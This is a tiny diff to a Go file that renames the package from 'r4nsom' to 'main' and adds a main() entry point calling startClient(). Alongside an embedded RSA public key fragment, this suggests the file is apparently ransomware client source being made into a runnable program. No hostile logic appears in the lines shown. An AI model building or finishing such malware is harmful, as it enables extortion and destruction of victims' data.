@@ -1,4 +1,4 @@
-package r4nsom
+package main
 
 import (
 	"os"
@@ -147,4 +147,8 @@ Jyd+z9VjWzaPdG61g9iLWnwe68UqV1ytCQIDAQAB
 	}
 
 	time.Sleep(10000 * time.Second)
+}
+
+func main() {
+	startClient()
 }
